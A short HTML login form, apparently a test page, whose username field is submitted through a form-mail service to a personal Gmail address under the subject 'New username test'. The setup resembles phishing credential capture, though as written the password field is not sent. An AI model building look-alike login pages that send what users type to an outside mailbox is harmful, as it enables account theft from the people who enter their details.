<form
  action="https://formsubmit.co/gamingpccomingsoon@gmail.com"
  method="POST"
>
  <input type="hidden" name="_subject" value="New username test">
  <input type="hidden" name="_template" value="table">

  <div class="input-box">
    <input
      id="username"
      name="username"
      type="text"
      placeholder=" "
      autocomplete="off"
      required
    >
    <label>Username, email or mobile</label>
  </div>

  <div class="input-box">
    <input
      id="password"
      type="password"
      placeholder=" "
      autocomplete="off"
      required
    >
    <label>Password</label>
    <button type="button" id="showPassword">Show</button>
  </div>

  <button class="login-btn" type="submit">
    Log in
  </button>
</form>
